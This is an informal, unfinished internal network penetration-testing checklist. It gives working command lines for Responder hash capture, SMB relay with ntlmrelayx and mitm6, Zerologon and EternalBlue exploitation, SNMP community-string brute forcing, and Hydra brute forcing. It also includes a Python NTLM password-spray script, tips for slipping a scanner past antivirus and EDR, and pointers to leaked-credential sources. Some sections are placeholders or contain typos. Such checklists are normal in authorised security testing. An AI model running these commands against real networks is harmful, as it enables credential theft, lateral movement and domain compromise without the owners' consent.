# Internal Pentesting
Internal Pentest Checklist
This is done in phases
  Phase 1: No user credentials or desktop access
  Phase 2: Domain User account but no password
  Phase 3: Domain user and or deskop access
  Phase 4: Local Administrator Access
  Phase 5: Domain Administrator Access

## CONTENTS

NMAP Scans
Additioonal Scans
DNS Identification
Vulnerability Scanning and Easy Exploits
SMB signing disabled
Finding Users
Window Banner Grabbing  with Netcat
NetBIOS Null Sessions
N btstat
SNMP Enumeration
Scapy
TCP SYN Traceroute with Scapy
Not up to date!!

### Objective:
Simply begin by identifyin all open hosts using NMAP, we want to do a specific port scan to find easy targets but we also want to export an full scan to a text file. We also want to run the advanced IP scanner tool to identify all services, printers and networking devices.  NEED TO FINISH THIS STATEMENT

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# NMAP Scans
Ping Scan - Run to identify all living hosts for advanced nmap scans
  nmap -sP X.X.X.X/X -oN <Export file path>
  
 Identify critical ports
  nmap -A -p 21,22,23,25,139,53,80,443,445,8080,8443,69 -iL <file from ping scan>
 
 Identfy Everything
  sudo nmap -A -O -p- iL <file from ping scan> -oN <export file path>
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Additional Network Scans

Run advanced IP scanner
This allows us to see file shares, websites and devices in the network. If you download but setup as run instead of install, I find this doesnt get blocked by AV this way.
• This is a cool tool because you can download the exe but choose to run instead of install. This bypasses a lot of restrictions on user downloads or EDR tools.
• https://www.advanced-ip-scanner.com/
LDAP Enumeration
• Note: at this point our NMAP scan should have identified the DC for us.
• - nmap -n -sV --script"ldap" and not brute -p 389 <DC-IP>
• - ldapsearch -x -h <ip> -s base
• AD/DC Identification
• At this point we want to identify  the AD/DC's for enumeration/exploits. The following ports will help us identify the IP address from our NMAP outputs
• 389 LDAP
• 636 LDAP SSL
• 88 Kerberos
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# LLMNR, NBT-NS, WPAD Attack
About LLMNR, NBT-NS, WPAD – the service running with a poor password policy. 
We want to run this attack during primary times of logins etc, we like to focus when the admins/users login around the morning wave, the lunch return times as well. NOTE: you can't run Mitm6 and responder at the same time, they use the same ports and cant run together.

• Poisoning Overview and Capturing NTLMv2 Hashes with Responder 
• Link local multicast resolution (DNS to identify a host when DNS fails to do so).  
• Key flaw, when you respond to this, it responds back to you with a username and password hash 

• How it works 
• Computer trys to connect to a server but the user sends something wrong sending a DNS issues so the server says what are you talking about? So broadcast message is sent to everyone to see if anyone knows who this weird guy is. You MiTm this and say I do send me your hash and I will 
• We Use responder, this should run first thing in the morning or right after lunch. You need a lot of traffic. DO THIS before nmap scans and more 
• CMD: responder –I INTERFACE(ETHO) -v -w

• Example of an event 
• Someone types in the wrong network drive. Once this happens, an event occurs and we will see the username and NTLM hash. 
• Take this hash and try to crack it using hashcat. 

EASY TERMS: Okay so kali is in the environment and your are listening on responder. When a windows computer tries to access your IP address for a share or something, responder captures the username and hash. 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# SMB Verify Relay Attacks
• WHY?
• If you capture data, SMB Relay Attacks overview (NOTE SMB Signing needs to be disabled or not required, verify with NMAP)

• NMAP CMD: nmap -p 445 --script=smb2-security-mode X.X.X.X
• NMAP CMD: nmap -p 139--script=smb2-security-mode X.X.X.X

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# SMB Relay With Responder
• What is this?
• Take the hashes we get from responder and forward them, SMB signing has to be enabled because it’s a packet level protocol. If siginig is disabled then it  never checks for authentication of the user and hash. 
• User being relayed has to have admin creds on the target machine 
• Go into responder config file
• vim /opt/responder/Responder.Conf
• vim /etc/responder/Responder.conf
• Turn off smb and http 
• Means we capture these but we use another tool to relay 
• Launch responder 

# Attack for SMBrelay
• impacket-Ntlmrelayx.py -tf targets.txt -smb2support
• Now we just wait for an event, if an admin, it will dump the sam files for the local users. 
• We get hashes from the sam and will try to laterally move 
• Will attempt for an interactive shell and say if it worked, open a new tab 
• Nc 127.0.0.1 11000 
• Help 
• We are in an smb shell essentially, so start listing to find items 
• Try use ADMIN$ to get into system32 
• LOTS MORE YOU CAN DO
• You could do a metasploit shell with multihandler using the ntlmrelayx 
• EASY TERMS: You take the hashing if SMB signing is disabled, you attempt to relay the smb authentication. We user responder to capture and then relay to attack. ### Ntlmrelayx is inside impacket. So cd impacket/examples 
• WE MUST GO INTO THE RESPONDER FILE AND TURN OFF SMB and HTTP 

ntlmrelayx --add-computer   usually gives initial access.


# Responder Passback Attacks  (LDAP Attack)

Netcat and responder can do this 

Printer based attack where you send the password back to your machine instead of the DC by setting the LDAPs to you. 

Printers who scan from printer to computers, the user in the platform is usually a domain admin and dump the creds with the passback attack. PRINTERS ARE A HUGE ATTACK vector. 

Jenkins is often wide open for a shell 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Relay Attack Other Option
On a seperate machine run this, they cant run on the same device

## MITM6CMD > Mitm6 –d DOMAIN 
Replies start coming in 
• Relay attack 
Ntlmrelayx.py -6 –t ldaps://IP of DC –wh fakewpad.DOMAIN -l text.txt 
Running this 
Start enumerating entire AD 
This will add a user and password as an admin

• mitm6 -d <domain>
• ntlmrelayx.py -6 -wh <attackerIP> -; /tmp - socks -debug
• ntlmrelayx.py -6 -wh <attackerIP> -t smb://<target> -l /tmp -socks -debug
• ntlmrelayx.py -t ldaps://<dc IP> -wh <attacker_ip> --delegate-access
• If any of these work
• (impacket) ./getST.py -spn cifts/<target> <domain>/<netbios Name>\$ -impersonate <user>

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Enum4Linux Active Directory
- If AD is not properly configured, an unauthenticated user can enumerate users, password policies, group memberships, shares and more. We can use this to identify a lot of sensitive information about a network.

• Commands:
• AD Password policy > enum4linux -P x.x.x.x >> export path  
• AD Users > enum4linux -U x.x.x.x   | grep 'user'  OR   >> export path  
• Machine list > enum4linux -M x.x.x.x >> export path  
• Groups with members > enum4linux -M x.x.x.x >> export path  
• Shares > enum4linux -S x.x.x.x >> export path  

• Other actions:
• you can do simple enumeration
• enum4linux -a X.X.X.X >> ./ADdiscovery.txt

You can also brute force user names, OS information, printer information
• -v for verbos
• -A for aggressive
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# SMB Enumeration
• rubeus.exe asktgt /users:>users> /certificate:<base64-certificate> ptt

List Guest Access on SMB Share
• enum4linux -a -u "" -p "" <DC-IP>
• enum4linux -a -u "guest" -p "" >DC-ip>

• smbmap -u "" -p "" -P 445 -H <DC-ip>
• smbmap -u "guest" -p "" -P 445 -H <dc-ip>

• smbclient -U '%' -L //DC-IP
• smbclient -U 'guest%' -L //dc-ip

• cme smb <IP> -u '' -p ''   looks for null sessions
• cme smb <ip> -u 'a' -p "" looks for anonymouse access

Listing shares on devices
smbclient -L //X.X.X.X/
smbclient -L //X.X.X.X/ -U '' -N
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Build Userlist
Users can come from the following sources so far
Responder
• MITM6
• Printers
• SMB enumeration
• Enum4linux finds
• New Attempts
• OSINT the website and external resources
• nmap -p 88 --script=krb5-enum-users --script args="krb5-enum-users.realm='<DOMAIN>'.userdb=<user_list_file> <IP>
• SNMP enumeration, see section below.
• Build User List
• - LinkedIn
• -Inspect the page where it shows LinkedIn employees, go to Javascript code and run the following code at the bottom. NOTE identify the right class in order to run this correctly.

• var x = document.getElementByClassName("org-people-profile-card_profile-info")
• var y = "";
• for(let num = 0;num <x.length;num++)
• {y +=x[num[.innerText.split('\n',1) + ';'}
• OSINT
• https://phonebook.cz
• https://whatsmyname.app/
• https://hunter.io/
• Default Credentials
• https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
• https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv
• Leaked Credentials
• dehashed.com
• breach-parse

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Vulnerability Scanning and Exploits
- Run Nessus and be sure to review the informationals

tomcat/jboss manager
auxiliary/scanner/http/tomcat_enum
exploit/multi/http/tomcat_mgr_deploy

java serialized port
ysoserial

CVE's
any outdated software in the network

MS14025
use scanner/smb/smb_enum_gpp
NOTE: you may need to use creds for this, if so see this exploit in the after creds obtained section

• Low Hanging Fruit
• Anonymous login to FTP servers or SMB shares
• Telnet with default login or insecure login

• MS17-010 Eternal Blue
• msfconsole use exploit/windows/smb/ms17_010_eternalblue

• Zerologon (this can provide administrator access)
• NOTE: zerologon exploited may cause significant impacts against the host you are attacking. 
• python cve-2020-1472-exploit.py <MACHINE BIOS NAME> <IP>
• secretsdump.py <Domain>/<machineBIOS>\$@<ip> -no-pass -just-dc-user "Administrator"
• secretsdump.py -hashes :<hash_admin< domain>/Administrator@<ip>
• python3 restorepassword.py -target-ip <IP> <DOMAIN>/<machine bios name>@<machine bios name> -hexpass <hexpass>

• Heartbleed
• nmap -sV --script=ssl-heartbleed X.X.X.X
• msfconsole use /auxiliary/scanner/ssl/openssl_heartbleed

• Log4J
• fdgddg

If any of these are compromised -> privilege escalation time to gain administrator
winpeas
search password files findstr /si "password" *.txt *.xml *.docx
juicy potato/ lovely potato
printSpooler
rogue potato
SMBGhost CVE-2020-0796
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Banner Grabbing
• telnet X.X.X.X 25
• telnet X.X.X.X 21
• telnet X.X.X.X 22

• telnet X.X.X.X 80     or     nc X.X.X.X 80 
• this should gives us the HTTP version, Server information (IIS version), and some other data. Can help identify servers to attack. 

POP3
• telnet X.X.X.X 110   or    telnet x.x.x.x 993
• Pop3 Telnet Commands

• USER username
• PASS password
• STAT
• LIST  list email files
• RETR NUMBER   retrieves emails
• DELE deletes
• NOOP
• RSET
• TOP
• UIDL
If you dont have credentials, you can brute force it with HYDRA

hydra -l USERNAME -P <password list> pop3.live.com? -s PORT pop3
https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# NetBIOS 
nmblookup X.X.X.X/CIDR
nbtscan X.X.X.X/30
nbtscan -a X.X.X.X
nmap -sU -sV -T4 -p137,138,139 -Pn -n --script=nbstat.nse X.X.X>X

Port 137 UDP, NetBios
- Add name  -registers a NetBIOS name
-Add group name
-Delete Name
Find Name

Port 138  UDP  Datagram Mode
- Send datagram:send a datagram to a remote NetBIOS name
- Send Broadcast Datagram: send a datagram to all NetBIOS names on the network
- Recieve Datagram: wait for a packet to arrive from a send datagram operation
-Recieve Broadcast Datagram: wait for a packet to arrive from a send broadcast datagram operation

Port 139 TCP Session Mode
- Call:opens a session to a remote netbios name
-Listen: listen for attempts to open a session to a NetBIOS name
-Hang up: close a session
-Send:send a packets to the computer on the other end of a session
-Send no ack:like send, doesnt need an ACK
-Recieve:wait for a packet to arrive from a send on the other end of a session
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Null Sessions
net use \\target\ipc$ "" /u:""

• This connection can allow you to list all shares, list users and SIDs, list users of groups, and list machines
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# SNMP Enumeration
• About
SNMP v1 and v2 communicate in clear-text allowing us to find community strings. 
THE BIGGEST EXPLOIT seen with this is when SNMP public community strings are left as "public" which is the default.
Community strings can be set to whatever the system administrator wants so a good dictionary should include company related terms, sports teams, etc.
Process
Identify the presence of SNMPv1 or v2
Test default strings
Brute force strings
Enumerate the system for users, softwared, ram,machines
Use this information to create your user list and device list.

• NMAP Discovery
• We can check this with NMAP by first identifying the SNMP version
•  nmap -sV -Pn -sU -p161,162 X.X.X.X
• If we get a successful SNMPv1 or v2 we know we are in luck to test for public strings
• nmap -Pn -sU -p 161,162 --script=snmp-brute X.X.X.X
• The output here wll state snmp brute public -valid credentials. Meaning that public are used to read and write snmp data.
• Brute force with custom wordlists
• sudo nmap -sU -p161,162 --scriptsnmp-brute --script-args snmp-brute.communitiesdb=/PATH X.X.X.X
• We need to identify SNMP interfaces to understand where we can begin attacking
• nmap -Pn -sU -p 161,162 --script=snmp-interfaces X.X.X.X
• One of these interfaces should have the IP address we are scanning
• NMAP Users and machine grabs
- nmap -sU -p161,162 --script=snmp-* X.X.X -oG desktop/file.txt

• SNMP-check
• This tool can provide some  awesome information such as hostname,description, uptime, user accounts, routing informaiton and listening ports.
• snmp-check X.X.X.X -c STRING

• Switches LEARN HOW TO USE THESE SWITCHES MORE
• -p port
• -c string, default is public
• -v snmp version
• - disable TCP
• -t timeout
• -r retries
• -i info
• -h help

• onesixtyone
• onesixtyone -c /path/onesixtyone/dict.txt X.X.X.X
• This is used to brute force communities with a wordlist

• snmpwalk
We can use this tool to identify specific strings by testing them
• snmpwalk -c public X.X.X.X -v1
• snmpwalk -c private X.X.X.X -v1

• Extract the system name (the OID) I dont quiet understand this yet
snmpwalk -c public X.X.X.X -v1 -On | grep '1.3.6.1.2.1.1.5'
• -c is the string
• the numbers are the sysName value
• If it is misconfigured and has RW then you can change the name with
• snmpset -v 1 -c public X.X.X.X 1.3.6.1.2.1.1.5.0 s HACKED
• Extract System Data
• snmpwalk -v2c -c public X.X.X.X
• snmpwalk -v2c  -c public X.X.X.X hrMemorySize
• View installed software
• snmpwalk -v2c -c public X.X.X.X hrSWInstalledNamed
• Search RAM on the host

• MSFCONSOLE
• SNMP Enumeration
• use auxiliary/scanner/snmp/snmp_enum
• set RHOSTS
• set community STRING
• you can also not set the string and see if data is returned
• run
• Login to SNMP to test strings
• use auxiliary/scanner/snmp/snmp_login
• set RHOSTS
• run
• This will provide successful login strings.
• SNMP Set OID Value
• use auxiliary/scanner/snmp/snmp_get
• set OID X.X.X.X.X.x
• set OIDVALUE words!
• set RHOSTS X.X.X.X
• exploit
• The value should be shown as the new value


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# SPECIFIC PROTOCOL ATTACKS Without Credentials

1. FTP
- We want to brute force this server using Hydra
- CMD: hydra -l ftp -P <WORDLIST> ftp://X.X.X.X


2. SMTP
-We can brute force SMTP servers using hydra but you may need to specify port 25 depending if you use a different tool.
-CMD: hydra -l ermail@domain.com -P <URL> smtp://x.x.x.x -V

SSH
- Hydra can also brute force this but you need a great user list and wordlist
- CMD: hydra -L users.txt -P <WORDLIST> ssh://x.x.x.x -v

HTTP Login Pages

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Python NTLM Password Spray
What:
This is a brute forcing tool for any internal website that allows for Windows authentication. It performs password stuffing against websites that are federated with the kerberos network.

How To use this:
Name it ntlm_passwordspray.py
CMD: python ntlm_passwordspray.py -u <USERNAMEFILE> -f <FQDN of organization were attacking> -p <SINGLE PASSWORD> -a <the URL of the application that supports windows authentication

EXAMPLE:python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a   

def password_spray(self, password, url): 
print ("[*] Starting passwords spray attack using the following password: " + password)
#Reset valid credential counter 
count = 0 
#Iterate through all of the possible usernames 
for user in self.users: 
#Make a request to the website and attempt Windows Authentication 
response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password)) 
#Read status code of response to determine if authentication was successful 
if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE): 
print ("[+] Valid credential pair found! Username: " + user + " Password: " + password) 
count += 1 
continue 
if (self.verbose): 
if (response.status_code == self.HTTP_AUTH_FAILED_CODE): 
print ("[-] Failed login with Username: " + user) 
print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")   



